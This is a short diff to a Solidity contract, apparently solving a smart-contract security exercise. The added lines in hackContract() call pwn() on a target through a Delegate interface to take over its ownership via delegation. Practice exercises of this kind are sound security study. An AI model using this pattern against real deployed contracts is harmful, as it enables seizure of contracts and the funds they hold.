@@ -11,5 +11,9 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+        Delegate hook; 
+        hook = Delegate(contractAddress);
+        
+        hook.pwn();
     }
 }
